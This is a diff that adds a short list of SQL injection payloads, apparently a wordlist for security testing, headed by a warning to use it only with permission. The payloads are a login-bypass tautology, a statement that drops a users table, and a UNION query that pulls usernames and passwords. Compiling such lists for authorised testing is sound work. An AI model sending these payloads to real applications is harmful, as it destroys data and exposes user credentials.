@@ -1,0 +1,4 @@
+# SQL injection payloads — use only on systems you own or have written permission to test
+' OR '1'='1
+'; DROP TABLE users; --
+1' UNION SELECT username, password FROM users--
